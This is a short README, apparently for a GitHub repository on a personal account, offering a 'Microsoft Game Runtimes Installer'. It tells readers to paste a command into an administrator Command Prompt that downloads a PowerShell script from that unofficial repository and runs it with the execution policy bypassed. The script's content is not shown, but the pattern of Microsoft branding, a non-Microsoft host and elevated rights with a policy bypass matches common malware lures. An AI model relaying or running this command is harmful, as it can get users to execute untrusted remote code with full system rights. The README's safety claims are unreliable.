# Microsoft Game Runtimes Installer

Installs commonly needed Microsoft game runtimes on Windows using Microsoft-hosted installers and built-in Windows components.

## One-command install from CMD

Open **Command Prompt as Administrator**, paste this command, and press Enter:

```cmd
curl.exe -L -o "%TEMP%\Install-Microsoft-Game-Runtimes.ps1" "https://raw.githubusercontent.com/davidmuller5273-boop/microsoft-game-runtimes-installer/main/Install-Microsoft-Game-Runtimes.ps1" && powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\Install-Microsoft-Game-Runtimes.ps1"
```

Restart Windows after the installation finishes.

## Components

- Microsoft Visual C++ 2015-2022 Redistributable (x64)
- Microsoft Visual C++ 2015-2022 Redistributable (x86)
- Microsoft DirectX End-User Runtime
- .NET Framework 3.5 Windows feature
- Legacy DirectPlay Windows feature

The PowerShell script accepts only installers with a valid Microsoft Authenticode signature before running them.

